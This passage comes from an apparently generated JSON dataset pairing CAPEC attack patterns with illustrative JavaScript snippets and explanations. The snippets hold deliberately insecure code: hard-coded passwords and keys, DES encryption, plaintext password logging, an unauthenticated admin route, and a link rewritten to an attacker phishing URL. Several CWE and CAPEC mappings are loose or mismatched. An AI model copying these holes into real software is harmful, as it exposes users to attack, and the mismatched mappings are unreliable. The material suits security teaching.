        "code_snippet": "const sensitiveData = 'userPassword123';\n\n// Simulate sending data to the server\nfunction sendData(data) {\n  // CWE-311: Missing Encryption of Sensitive Data\n  // Data is sent in plaintext\n  console.log('Sending data to server:', data);\n}\n\n// CWE-602: Client-Side Enforcement of Server-Side Security\n// Client-side validation (easily bypassed)\nfunction validateData(data) {\n  if (data === 'userPassword123') {\n    return true;\n  }\n  return false;\n}\n\n// CWE-345: Insufficient Verification of Data Authenticity\n// CWE-346: Origin Validation Error\n// Simulate an attacker intercepting and modifying the data\nfunction manInTheMiddleAttack(data) {\n  // Modify the data (CWE-471: Modification of Assumed-Immutable Data)\n  const modifiedData = 'attackerPassword456';\n  console.log('Data modified by attacker:', modifiedData);\n  return modifiedData;\n}\n\n// Original data sent by client\nlet dataToSend = sensitiveData;\n\n// Attacker intercepts and modifies the data\ndataToSend = manInTheMiddleAttack(dataToSend);\n\n// Send the modified data to the server\nsendData(dataToSend);",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker performs an Application API Message Manipulation via Man-in-the-Middle attack. The code highlights several vulnerabilities: \n\n1. **CWE-311: Missing Encryption of Sensitive Data** - The sensitive data (`userPassword123`) is sent to the server in plaintext, making it easy for an attacker to intercept.\n\n2. **CWE-602: Client-Side Enforcement of Server-Side Security** - The client-side validation function (`validateData`) is easily bypassed, as it relies on the client to enforce security.\n\n3. **CWE-345: Insufficient Verification of Data Authenticity** and **CWE-346: Origin Validation Error** - The server does not verify the authenticity or origin of the data, allowing the attacker to modify it.\n\n4. **CWE-471: Modification of Assumed-Immutable Data** - The attacker intercepts and modifies the data (`manInTheMiddleAttack` function), changing it from `userPassword123` to `attackerPassword456`.\n\nThe code simulates the process of sending sensitive data from a client to a server, with an attacker intercepting and modifying the data in transit, demonstrating the vulnerabilities and potential impact of such an attack."
    },
    {
        "capec_id": "385",
        "capec_name": "Transaction or Event Tampering via Application API Manipulation",
        "code_snippet": "const http = require('http');\nconst net = require('net');\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk;\n  });\n  req.on('end', () => {\n    // Simulate tampering with the transaction data\n    if (body.includes('transaction')) {\n      body = body.replace('amount=100', 'amount=1000'); // CWE-471: Modification of Assumed-Immutable Data\n    }\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Transaction processed');\n  });\n});\n\nserver.listen(8080, '127.0.0.1', () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});\n\n// Man-in-the-middle attack simulation\nconst client = net.createConnection({ port: 8080 }, () => {\n  client.write('POST / HTTP/1.1\\r\\n');\n  client.write('Host: 127.0.0.1\\r\\n');\n  client.write('Content-Length: 20\\r\\n');\n  client.write('\\r\\n');\n  client.write('transaction=amount=100');\n});\n\nclient.on('data', (data) => {\n  console.log(data.toString());\n  client.end();\n});",
        "description": "This JavaScript code snippet demonstrates a simplified version of a man-in-the-middle attack where an attacker intercepts and modifies transaction data. The HTTP server listens for incoming requests and processes transaction data. If the data contains a transaction, it modifies the amount from 100 to 1000, representing CWE-471 (Modification of Assumed-Immutable Data). The client simulates sending a transaction request to the server. This code embodies the main idea of CAPEC-Transaction or Event Tampering via Application API Manipulation by showing how an attacker can alter the integrity of the transfer process."
    },
    {
        "capec_id": "386",
        "capec_name": "Application API Navigation Remapping",
        "code_snippet": "function manipulateLink() {\n    // CWE-471: Modification of Assumed-Immutable Data\n    var originalLink = document.getElementById('userProfileLink');\n    if (originalLink) {\n        // CWE-345: Insufficient Verification of Data Authenticity\n        // CWE-346: Origin Validation Error\n        var maliciousLink = 'http://attacker.com/phishing';\n        originalLink.href = maliciousLink;\n    }\n}\n\n// CWE-602: Client-Side Enforcement of Server-Side Security\n// This function should be called only after proper server-side validation\nmanipulateLink();",
        "description": "This JavaScript code snippet demonstrates an 'Application API Navigation Remapping' attack. The function `manipulateLink` modifies the href attribute of a link element with the ID 'userProfileLink' to point to a malicious URL. This embodies CWE-471 by altering an assumed-immutable element, CWE-345 and CWE-346 by not verifying the authenticity or origin of the new link, and CWE-602 by relying on client-side enforcement of security. The code represents how an attacker can manipulate navigation elements to redirect users to attacker-controlled destinations, potentially for phishing or other malicious purposes."
    },
    {
        "capec_id": "387",
        "capec_name": "Navigation Remapping To Propagate Malicious Content",
        "code_snippet": "const sensitiveData = 'userPassword123';\n\n// CWE-311: Missing Encryption of Sensitive Data\nlocalStorage.setItem('password', sensitiveData);\n\n// CWE-345: Insufficient Verification of Data Authenticity\nfunction fetchData(url) {\n  fetch(url)\n    .then(response => response.json())\n    .then(data => {\n      // CWE-471: Modification of Assumed-Immutable Data (MAID)\n      if (data.isAdmin) {\n        window.location.href = '/admin';\n      } else {\n        window.location.href = '/user';\n      }\n    })\n    .catch(error => console.error('Error fetching data:', error));\n}\n\n// CWE-602: Client-Side Enforcement of Server-Side Security\nfetchData('https://example.com/api/user');",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC 'Navigation Remapping To Propagate Malicious Content'. The code stores sensitive data (a password) in localStorage without encryption (CWE-311). It fetches data from a URL without verifying the authenticity of the data (CWE-345). The fetched data is assumed to be immutable and is used to redirect the user based on their admin status (CWE-471). Finally, the code relies on client-side logic to enforce server-side security by redirecting users based on their admin status (CWE-602). This combination of issues can be exploited by an adversary to manipulate navigation and propagate malicious content."
    },
    {
        "capec_id": "388",
        "capec_name": "Application API Button Hijacking",
        "code_snippet": "const apiResponse = {\n  button: {\n    label: 'Click Me',\n    url: 'https://trusted-site.com'\n  }\n};\n\n// Vulnerable code: No verification of data authenticity\nfunction renderButton(response) {\n  const button = document.createElement('button');\n  button.innerText = response.button.label;\n  button.onclick = function() {\n    window.location.href = response.button.url;\n  };\n  document.body.appendChild(button);\n}\n\n// Simulate an attacker modifying the API response\nconst attackerResponse = JSON.parse(JSON.stringify(apiResponse));\nattackerResponse.button.url = 'https://attacker-site.com';\n\n// Render the button with the manipulated response\nrenderButton(attackerResponse);",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an attacker can manipulate the API response to change the destination URL of a button. The `apiResponse` object initially contains a trusted URL, but an attacker can modify it to point to a malicious site. The `renderButton` function does not verify the authenticity of the data, leading to the button redirecting users to an attacker-controlled destination. This example embodies the CAPEC of 'Application API Button Hijacking' and highlights related CWEs such as 'Insufficient Verification of Data Authenticity' (CWE-345) and 'Modification of Assumed-Immutable Data' (CWE-471)."
    },
    {
        "capec_id": "389",
        "capec_name": "Content Spoofing Via Application API Manipulation",
        "code_snippet": "const http = require('http');\nconst server = http.createServer((req, res) => {\n  let data = '';\n  req.on('data', chunk => {\n    data += chunk;\n  });\n  req.on('end', () => {\n    // Simulate content manipulation\n    if (data.includes('auth_token')) {\n      data = data.replace('auth_token', 'fake_token');\n    }\n    // Respond with manipulated content\n    res.writeHead(200, {'Content-Type': 'application/json'});\n    res.end(JSON.stringify({ message: 'Data received', data: data }));\n  });\n});\nserver.listen(8080, () => {\n  console.log('Server running on port 8080');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server listens for incoming requests and captures the data sent by the client. It then manipulates the content of the data by replacing an 'auth_token' with a 'fake_token', simulating a content spoofing attack. This demonstrates the CAPEC concept of 'Content Spoofing Via Application API Manipulation' by altering the content of messages in transit. The code also highlights related CWEs such as 'Missing Support for Integrity Check' (CWE-353) and 'Client-Side Enforcement of Server-Side Security' (CWE-602), as the server does not verify the integrity of the data and relies on client-side data, making it vulnerable to manipulation."
    },
    {
        "capec_id": "390",
        "capec_name": "Bypassing Physical Security",
        "code_snippet": "const accessControl = (user) => {\n  if (user.hasPhysicalAccess) {\n    console.log('Access granted to sensitive information.');\n  } else {\n    console.log('Access denied.');\n  }\n};\n\nconst simulateVoltageGlitch = () => {\n  console.log('Voltage glitch detected! Bypassing security checks...');\n  accessControl({ hasPhysicalAccess: true });\n};\n\nconst simulateEMFI = () => {\n  console.log('EMFI attack detected! Bypassing security checks...');\n  accessControl({ hasPhysicalAccess: true });\n};\n\n// Simulate an attack\nsimulateVoltageGlitch();\nsimulateEMFI();",
        "description": "This JavaScript code snippet simulates a scenario where physical security mechanisms are bypassed through voltage glitches and electromagnetic fault injection (EMFI) attacks. The `accessControl` function checks if a user has physical access to grant or deny access to sensitive information. The `simulateVoltageGlitch` and `simulateEMFI` functions represent attacks that bypass these security checks by simulating voltage glitches and EMFI attacks, respectively. This embodies the main idea of CAPEC by demonstrating how physical security can be compromised through deliberate and carefully planned attacks, as described in the related CWEs."
    },
    {
        "capec_id": "391",
        "capec_name": "Bypassing Physical Locks",
        "code_snippet": "class PhysicalLock {\n  constructor() {\n    this.locked = true;\n    this.debugMode = false;\n  }\n\n  unlock() {\n    if (this.debugMode) {\n      console.log('Debug mode active: Lock bypassed.');\n      this.locked = false;\n    } else {\n      console.log('Attempt to unlock failed: Access denied.');\n    }\n  }\n\n  setDebugMode(mode) {\n    this.debugMode = mode;\n  }\n}\n\n// Example usage\nconst lock = new PhysicalLock();\nlock.unlock(); // Attempt to unlock without debug mode\nlock.setDebugMode(true); // Enable debug mode\nlock.unlock(); // Unlock with debug mode enabled",
        "description": "This JavaScript code snippet defines a `PhysicalLock` class that simulates a physical lock mechanism. The lock can be bypassed if the `debugMode` is enabled, representing the CWE-1234 (Hardware Internal or Debug Modes Allow Override of Locks). The `unlock` method checks if the `debugMode` is active; if it is, the lock is bypassed, otherwise, access is denied. This demonstrates the vulnerability where an attacker can exploit debug modes to bypass physical security measures, aligning with the CAPEC description of bypassing physical locks."
    },
    {
        "capec_id": "392",
        "capec_name": "Lock Bumping",
        "code_snippet": "const lock = { isLocked: true, lockBit: 1, addressRegion: '0x00FF', powerState: 'ON' };\n\nfunction bumpKeyAttack(lock) {\n  // Simulate improper prevention of lock bit modification (CWE-1231)\n  lock.lockBit = 0;\n  // Simulate insufficient granularity of address regions (CWE-1222)\n  if (lock.addressRegion === '0x00FF') {\n    lock.isLocked = false;\n  }\n  // Simulate improper lock behavior after power state transition (CWE-1232)\n  if (lock.powerState === 'OFF') {\n    lock.isLocked = false;\n  }\n  return lock.isLocked ? 'Lock is still secure' : 'Lock has been bumped open';\n}\n\nconsole.log(bumpKeyAttack(lock));",
        "description": "This JavaScript code snippet simulates a lock bumping attack by exploiting vulnerabilities related to lock bit modification, address region protection, and power state transitions. The `lock` object represents a lock with properties such as `isLocked`, `lockBit`, `addressRegion`, and `powerState`. The `bumpKeyAttack` function attempts to 'bump' the lock open by modifying the `lockBit`, checking the address region, and simulating a power state transition. If any of these conditions are met, the lock is considered 'bumped' open. This code embodies the main idea of the CAPEC by demonstrating how an attacker might exploit these weaknesses to gain unauthorized access."
    },
    {
        "capec_id": "393",
        "capec_name": "Lock Picking",
        "code_snippet": "class Lock {\n  constructor() {\n    this.locked = false;\n  }\n\n  lock() {\n    if (!this.locked) {\n      this.locked = true;\n      console.log('Resource is now locked.');\n    } else {\n      console.log('Resource is already locked.');\n    }\n  }\n\n  unlock() {\n    if (this.locked) {\n      this.locked = false;\n      console.log('Resource is now unlocked.');\n    } else {\n      console.log('Resource was not locked.'); // CWE-832\n    }\n  }\n\n  isLocked() {\n    return this.locked;\n  }\n}\n\n// Simulate lock picking\nconst lock = new Lock();\nlock.lock();\n\n// Attacker bypasses the lock\nlock.locked = false; // CWE-1231\nconsole.log('Lock status after attack:', lock.isLocked() ? 'Locked' : 'Unlocked');",
        "description": "This JavaScript code snippet defines a simple `Lock` class that simulates the locking and unlocking of a resource. The `lock` method sets the lock state to true if it is not already locked, and the `unlock` method sets it to false if it is currently locked. The `isLocked` method returns the current state of the lock. The code also includes a simulation of an attacker bypassing the lock by directly modifying the `locked` property, which represents CWE-1231 (Improper Prevention of Lock Bit Modification). Additionally, the `unlock` method checks if the resource is already locked before unlocking it, addressing CWE-832 (Unlock of a Resource that is not Locked). This snippet embodies the main idea of the CAPEC by demonstrating how an attacker can manipulate the lock state to bypass security measures."
    },
    {
        "capec_id": "394",
        "capec_name": "Using a Snap Gun Lock to Force a Lock",
        "code_snippet": "class Lock {\n  constructor() {\n    this.locked = true;\n    this.lockBit = 1; // Represents the lock bit\n  }\n\n  unlock() {\n    if (this.lockBit === 1) {\n      console.log('Lock is protected, cannot unlock directly.');\n    } else {\n      this.locked = false;\n      console.log('Lock is now unlocked.');\n    }\n  }\n\n  forceUnlock() {\n    // Simulate the snap gun effect by directly modifying the lock state\n    this.locked = false;\n    console.log('Lock has been forcefully unlocked, potential damage detected.');\n  }\n\n  modifyLockBit(newBit) {\n    // CWE-1231: Improper Prevention of Lock Bit Modification\n    this.lockBit = newBit;\n    console.log('Lock bit has been modified.');\n  }\n}\n\nconst myLock = new Lock();\nmyLock.unlock(); // Attempt to unlock normally\nmyLock.modifyLockBit(0); // Improperly modify the lock bit\nmyLock.unlock(); // Now unlocks due to modified lock bit\nmyLock.forceUnlock(); // Force unlock, simulating snap gun effect",
        "description": "This JavaScript code snippet represents a simplified model of a lock mechanism, embodying the main idea of the CAPEC 'Using a Snap Gun Lock to Force a Lock'. The 'Lock' class has a 'locked' state and a 'lockBit' that protects the lock. The 'unlock' method checks the 'lockBit' before unlocking, simulating a protected lock. The 'forceUnlock' method simulates the snap gun effect by forcefully unlocking the lock, potentially causing damage. The 'modifyLockBit' method demonstrates CWE-1231 by allowing the lock bit to be improperly modified, bypassing the protection and enabling the lock to be unlocked. This code illustrates how an attacker might exploit weaknesses in lock protection mechanisms to gain unauthorized access."
    },
    {
        "capec_id": "395",
        "capec_name": "Bypassing Electronic Locks and Access Controls",
        "code_snippet": "const crypto = require('crypto');\n\n// Hard-coded cryptographic key (CWE-321)\nconst hardCodedKey = '1234567890abcdef';\n\n// Function to encrypt data using a broken algorithm (CWE-327)\nfunction encryptData(data) {\n  const cipher = crypto.createCipher('des', hardCodedKey); // DES is considered a broken algorithm\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\n// Simulate access control check\nfunction accessControl(cardData) {\n  const encryptedCardData = encryptData(cardData);\n  // Simulate a check against a stored encrypted card data\n  const storedEncryptedData = 'e99a18c428cb38d5f260853678922e03'; // Example of stored encrypted data\n  if (encryptedCardData === storedEncryptedData) {\n    console.log('Access Granted');\n  } else {\n    console.log('Access Denied');\n  }\n}\n\n// Example usage\nconst cardData = 'user_card_data';\naccessControl(cardData);",
        "description": "This JavaScript code snippet demonstrates a simplified electronic access control system that uses a hard-coded cryptographic key (CWE-321) and a broken cryptographic algorithm (DES, CWE-327) to encrypt card data. The `encryptData` function encrypts the card data using DES, which is known to be insecure. The `accessControl` function simulates an access control check by comparing the encrypted card data with a stored encrypted value. This code embodies the main idea of CAPEC-115: 'Bypassing Electronic Locks and Access Controls', by illustrating how weak cryptographic practices can be exploited to bypass security mechanisms. An attacker could reverse-engineer the encryption process or use the hard-coded key to generate valid card data, thereby gaining unauthorized access."
    },
    {
        "capec_id": "396",
        "capec_name": "DEPRECATED: Bypassing Card or Badge-Based Systems",
        "code_snippet": "const crypto = require('crypto');\n\nfunction authenticate(cardData) {\n  // Simulate reading card data (e.g., magnetic stripe or RFID)\n  const storedCardData = '1234567890'; // Example of stored card data\n\n  // Vulnerable comparison allowing authentication bypass by spoofing\n  if (cardData == storedCardData) {\n    console.log('Authentication successful');\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\n// Simulate an attacker capturing and replaying card data\nconst capturedCardData = '1234567890';\nauthenticate(capturedCardData);",
        "description": "This JavaScript code snippet demonstrates a vulnerable authentication mechanism for a card-based system. The `authenticate` function compares the provided card data with stored card data using a simple equality check. This approach is vulnerable to authentication bypass by spoofing (CWE-290) and capture-replay attacks (CWE-294). An attacker can capture valid card data and replay it to gain unauthorized access. The code highlights the risks associated with using weak or broken authentication schemes and the importance of implementing robust cryptographic methods to protect against such attacks."
    },
    {
        "capec_id": "397",
        "capec_name": "Cloning Magnetic Strip Cards",
        "code_snippet": "const magstripeData = '1234567890123456'; // Example magstripe data\n\nclass MagstripeCard {\n  constructor(data) {\n    this.data = data;\n  }\n\n  clone() {\n    return new MagstripeCard(this.data);\n  }\n}\n\n// Simulate reading a magstripe card\nconst originalCard = new MagstripeCard(magstripeData);\nconsole.log('Original Card Data:', originalCard.data);\n\n// Clone the card to create a duplicate\nconst clonedCard = originalCard.clone();\nconsole.log('Cloned Card Data:', clonedCard.data);\n\n// Simulate using the cloned card for unauthorized access\nfunction useCard(card) {\n  if (card.data === magstripeData) {\n    console.log('Access Granted');\n  } else {\n    console.log('Access Denied');\n  }\n}\n\nuseCard(clonedCard);",
        "description": "This JavaScript code snippet demonstrates the concept of cloning magnetic strip cards to gain unauthorized access, as described in the CAPEC. The `MagstripeCard` class represents a magnetic strip card containing sensitive data. The `clone` method allows for duplicating the card, embodying CWE-498 (Cloneable Class Containing Sensitive Information). The `useCard` function simulates using the cloned card to gain access, highlighting the vulnerability of magstripe technology to unauthorized duplication. The code illustrates how easily an attacker can clone a magstripe card and use the duplicate to gain unauthorized access."
    },
    {
        "capec_id": "398",
        "capec_name": "Magnetic Strip Card Brute Force Attacks",
        "code_snippet": "const crypto = require('crypto');\n\n// Hard-coded cryptographic key (CWE-321)\nconst hardCodedKey = '1234567890abcdef';\n\n// Simulate reading magnetic strip card data\nfunction readCardData(card) {\n  // Simulated card data (CWE-327: Use of a Broken or Risky Cryptographic Algorithm)\n  const cardData = crypto.createCipher('aes-128-ecb', hardCodedKey).update(card, 'utf8', 'hex');\n  return cardData;\n}\n\n// Simulate brute force attack (CWE-307: Improper Restriction of Excessive Authentication Attempts)\nfunction bruteForceAttack(card1, card2) {\n  const card1Data = readCardData(card1);\n  const card2Data = readCardData(card2);\n  let generatedCardData;\n\n  for (let i = 0; i < 1000000; i++) { // Simulate excessive attempts\n    generatedCardData = crypto.createCipher('aes-128-ecb', hardCodedKey).update(`card${i}`, 'utf8', 'hex');\n    if (generatedCardData === card1Data || generatedCardData === card2Data) {\n      console.log('Valid card data found:', `card${i}`);\n      break;\n    }\n  }\n}\n\n// Example usage\nbruteForceAttack('card1', 'card2');",
        "description": "This JavaScript code snippet simulates a brute force attack on magnetic strip card data. It embodies the main idea of CAPEC-111 (Magnetic Strip Card Brute Force Attacks) by demonstrating how an adversary might analyze data from two cards to generate valid sequences for unauthorized access. The code uses a hard-coded cryptographic key (CWE-321) and a broken or risky cryptographic algorithm (CWE-327) to simulate the encryption of card data. It then performs a brute force attack (CWE-307) by attempting multiple authentication attempts to find a valid card sequence. This example highlights the vulnerabilities associated with improper restriction of authentication attempts, use of hard-coded keys, and weak cryptographic algorithms."
    },
    {
        "capec_id": "399",
        "capec_name": "Cloning RFID Cards or Chips",
        "code_snippet": "const rfidReader = require('rfid-reader');\nconst clonedRFID = {};\n\nrfidReader.on('data', (data) => {\n  const identifier = data.id;\n  if (!clonedRFID[identifier]) {\n    clonedRFID[identifier] = data;\n    console.log(`Cloned RFID with ID: ${identifier}`);\n  } else {\n    console.log(`Duplicate RFID detected with ID: ${identifier}`);\n  }\n});\n\n// Simulate an attack by replaying the cloned RFID data\nfunction replayClonedRFID(id) {\n  if (clonedRFID[id]) {\n    rfidReader.emit('data', clonedRFID[id]);\n    console.log(`Replayed RFID with ID: ${id}`);\n  } else {\n    console.log(`No cloned RFID found with ID: ${id}`);\n  }\n}\n\n// Example usage\nsetTimeout(() => replayClonedRFID('12345'), 5000);",
        "description": "This JavaScript code snippet simulates the cloning of RFID cards or chips. It uses an RFID reader to capture data from RFID chips and stores the data in a 'clonedRFID' object using the chip's identifier as the key. If an RFID with the same identifier is read again, it logs a message indicating a duplicate RFID. The 'replayClonedRFID' function simulates an attack by replaying the cloned RFID data, demonstrating how an attacker could use the cloned data to gain unauthorized access. This code embodies the main idea of CAPEC-170 (Cloning RFID Cards or Chips) and highlights related weaknesses such as insecure security identifier mechanisms (CWE-1294) and the use of duplicate identifiers (CWE-694)."
    },
    {
        "capec_id": "400",
        "capec_name": "RFID Chip Deactivation or Destruction",
        "code_snippet": "class RFIDChip {\n  constructor() {\n    this.active = true;\n    this.sensitiveData = 'Sensitive Information';\n  }\n\n  deactivateChip() {\n    // CWE-1191: No access control for deactivation\n    this.active = false;\n    console.log('RFID Chip deactivated');\n  }\n\n  injectError() {\n    // CWE-1334: Unauthorized error injection\n    if (this.active) {\n      this.active = false;\n      console.log('Error injected, RFID Chip deactivated');\n    }\n  }\n\n  readSensitiveData() {\n    // CWE-1266: Improper scrubbing of sensitive data\n    if (!this.active) {\n      console.log('Sensitive Data:', this.sensitiveData);\n    } else {\n      console.log('RFID Chip is active, cannot read sensitive data');\n    }\n  }\n}\n\n// Example usage\nconst rfid = new RFIDChip();\nrfid.deactivateChip(); // Deactivates the chip\nrfid.readSensitiveData(); // Reads sensitive data after deactivation\nrfid.injectError(); // Injects error to deactivate the chip",
        "description": "This JavaScript code snippet represents an RFID chip class with methods to deactivate the chip, inject errors, and read sensitive data. The `deactivateChip` method demonstrates CWE-1191 by deactivating the chip without proper access control. The `injectError` method simulates CWE-1334 by allowing unauthorized error injection to deactivate the chip. The `readSensitiveData` method illustrates CWE-1266 by allowing sensitive data to be read after the chip is deactivated, highlighting improper scrubbing of sensitive data. This code embodies the main idea of CAPEC-170, which involves deactivating or destroying an RFID chip to render it unresponsive."
    },
    {
        "capec_id": "401",
        "capec_name": "Physically Hacking Hardware",
        "code_snippet": "const fs = require('fs');\nconst hardwareAccess = require('hardware-access');\n\n// Simulate improper physical access control\nif (fs.existsSync('/dev/hardware')) {\n  // Simulate improper restriction of software interfaces to hardware features\n  hardwareAccess.enableDebugMode();\n  \n  // Simulate improper protection against voltage and clock glitches\n  hardwareAccess.setVoltage(5.0);\n  hardwareAccess.setClockSpeed(3.0);\n  \n  // Simulate hardware allowing activation of test or debug logic at runtime\n  hardwareAccess.activateTestMode();\n  \n  // Simulate improper protection of physical side channels\n  const sensitiveData = hardwareAccess.readSensitiveData();\n  console.log('Sensitive Data:', sensitiveData);\n}",
        "description": "This JavaScript code snippet simulates a scenario where an adversary exploits various hardware vulnerabilities to gain unauthorized access and manipulate hardware components. The code checks for the existence of a hardware device, then proceeds to enable debug mode, manipulate voltage and clock settings, activate test mode, and finally read sensitive data. This embodies the main idea of the CAPEC 'Physically Hacking Hardware' by demonstrating how improper physical access control and other related weaknesses (CWEs) can be exploited to undermine system integrity."
    },
    {
        "capec_id": "402",
        "capec_name": "Bypassing ATA Password Security",
        "code_snippet": "const hardCodedPassword = 'defaultPassword';\n\nfunction authenticate(password) {\n  if (password === hardCodedPassword) {\n    console.log('Access granted');\n    return true;\n  } else {\n    console.log('Access denied');\n    return false;\n  }\n}\n\nfunction updatePassword(newPassword) {\n  // Improper authorization check: allows password update without prior authentication\n  hardCodedPassword = newPassword;\n  console.log('Password updated successfully');\n}\n\n// Example usage\nconst userPassword = 'defaultPassword';\nif (authenticate(userPassword)) {\n  updatePassword('newSecurePassword');\n}",
        "description": "This JavaScript code snippet demonstrates a simplified version of the 'Bypassing ATA Password Security' vulnerability. The `authenticate` function checks if the provided password matches a hard-coded password. The `updatePassword` function allows updating the password without any prior authentication, representing an improper authorization check (CWE-285). The use of a hard-coded password (CWE-259) and the lack of sufficient access control granularity (CWE-1220) are also illustrated. This code highlights how an attacker could exploit such weaknesses to bypass security mechanisms and gain unauthorized access."
    },
    {
        "capec_id": "404",
        "capec_name": "DEPRECATED: Social Information Gathering Attacks",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  // Log request details\n  fs.appendFile('server.log', `Request: ${req.url}\\n`, (err) => {\n    if (err) throw err;\n  });\n\n  // Simulate authentication bypass\n  if (req.url === '/admin') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Welcome to the admin panel');\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server that logs request details to a file named 'server.log'. It simulates an authentication bypass by allowing access to an admin panel without proper authentication checks. This embodies the deprecated CAPEC related to social information gathering attacks and the related CWEs, such as CWE-532 (Information Exposure Through Server Log Files) and CWE-287 (Authentication Bypass Issues). The code demonstrates how sensitive information can be exposed through server logs and how improper authentication checks can lead to unauthorized access."
    },
    {
        "capec_id": "405",
        "capec_name": "DEPRECATED: Social Information Gathering via Research",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  // Log request details\n  fs.appendFile('server.log', `Request: ${req.url} - ${new Date().toISOString()}\n`, (err) => {\n    if (err) throw err;\n  });\n\n  // Simulate authentication bypass\n  if (req.url === '/admin') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Welcome to the admin panel');\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server logs all incoming requests to a file named 'server.log', which can lead to information exposure (related to deprecated CWE-533). Additionally, the code contains a simulated authentication bypass vulnerability (related to deprecated CWE-592) by allowing access to an '/admin' endpoint without proper authentication checks. This snippet embodies the main idea of the deprecated CAPEC by demonstrating how improper handling of information and authentication can lead to security vulnerabilities."
    },
    {
        "capec_id": "406",
        "capec_name": "Dumpster Diving",
        "code_snippet": "const fs = require('fs');\nconst sensitiveData = 'User: admin, Password: admin123';\n\n// Storing sensitive information in cleartext in memory\nlet memoryStorage = sensitiveData;\n\n// Writing sensitive information to a file in cleartext\nfs.writeFileSync('sensitive_info.txt', sensitiveData);\n\n// Simulating improper scrubbing of sensitive data from decommissioned device\nfunction decommissionDevice() {\n  fs.unlinkSync('sensitive_info.txt'); // File is deleted but data might still be recoverable\n}\n\ndecommissionDevice();\n\n// Simulating exposure of version-control repository\nfs.writeFileSync('.git/config', '[core]\\nrepositoryformatversion = 0\\n');\n\n// Simulating exposure of core dump file\nfs.writeFileSync('core_dump', 'Core dump data...');",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC 'Dumpster Diving' and associated CWEs. The code stores sensitive information in cleartext in memory and writes it to a file, representing CWE-316 and CWE-319. It simulates the improper scrubbing of sensitive data by deleting a file without ensuring the data is unrecoverable, representing CWE-1266. Additionally, it shows the exposure of a version-control repository and a core dump file to unauthorized access, representing CWE-527 and CWE-528. This code highlights how sensitive information can be mishandled and potentially exposed, making it susceptible to dumpster diving attacks."
    },
    {
        "capec_id": "407",
        "capec_name": "Pretexting",
        "code_snippet": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\n\napp.use(session({\n  secret: 'secret-key',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { secure: false }\n}));\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  // Simulate user authentication\n  if (username === 'admin' && password === 'password') {\n    req.session.user = { username: 'admin' };\n    res.send('Logged in');\n  } else {\n    res.send('Invalid credentials');\n  }\n});\n\napp.get('/sensitive-data', (req, res) => {\n  if (req.session.user && req.session.user.username === 'admin') {\n    res.send('Sensitive Information');\n  } else {\n    res.send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server with session management. The code demonstrates a login endpoint and an endpoint to access sensitive data. The login endpoint does not invalidate any existing session identifier (CWE-384), which can lead to session fixation attacks. The sensitive data endpoint checks if the user is authenticated but does not adequately verify the identity of actors at both ends of the communication channel (CWE-300). This setup can be exploited by an adversary using pretexting to manipulate a user into revealing sensitive information (CAPEC-384). Additionally, the code does not properly represent critical information in the user interface (CWE-451), potentially leading to phishing attacks. The overall scenario represents how an attacker can create a pretext to gain unauthorized access to sensitive information."
    },
    {
        "capec_id": "408",
        "capec_name": "DEPRECATED: Information Gathering from Traditional Sources",
        "code_snippet": "const fs = require('fs');\n\n// Vulnerable code: Storing sensitive information in a log file\nfunction logSensitiveData(data) {\n  const logFile = 'server.log';\n  fs.appendFileSync(logFile, `Sensitive Data: ${data}\\n`);\n}\n\n// Example usage\nlogSensitiveData('User password: 12345');",
        "description": "This JavaScript code snippet demonstrates a vulnerability where sensitive information is logged into a server log file. The function `logSensitiveData` appends sensitive data to a file named 'server.log'. This embodies the deprecated CAPEC pattern of 'Information Gathering from Traditional Sources' and related CWEs such as 'Information Exposure Through Server Log Files' (CWE-533) and 'Information Exposure Through Debug Log Files' (CWE-534). The main idea is to highlight the risk of exposing sensitive information through improper logging practices."
    },
    {
        "capec_id": "409",
        "capec_name": "DEPRECATED: Information Gathering from Non-Traditional Sources",
        "code_snippet": "const fs = require('fs');\nconst dns = require('dns');\n\n// Vulnerable: Storing sensitive information in log files\nfunction logSensitiveData(data) {\n  fs.appendFile('server.log', `Sensitive Data: ${data}\\n`, (err) => {\n    if (err) throw err;\n    console.log('Sensitive data logged.');\n  });\n}\n\n// Vulnerable: Making security decisions based on DNS lookups\nfunction checkDomain(domain) {\n  dns.lookup(domain, (err, address) => {\n    if (err) throw err;\n    if (address === '192.168.1.1') {\n      console.log('Domain is trusted.');\n    } else {\n      console.log('Domain is not trusted.');\n    }\n  });\n}\n\n// Example usage\nlogSensitiveData('User password: 12345');\ncheckDomain('example.com');",
        "description": "This JavaScript code snippet demonstrates two deprecated vulnerabilities related to information exposure and security decisions based on DNS lookups. The `logSensitiveData` function logs sensitive information, such as user passwords, to a server log file, which can lead to information exposure (related to CWE-532). The `checkDomain` function makes a security decision based on the result of a DNS lookup, which can be unreliable and lead to security issues (related to CWE-350). The code embodies the main idea of the deprecated CAPEC by showing how sensitive information can be mishandled and how security decisions can be improperly made based on non-traditional sources like DNS lookups."
    },
    {
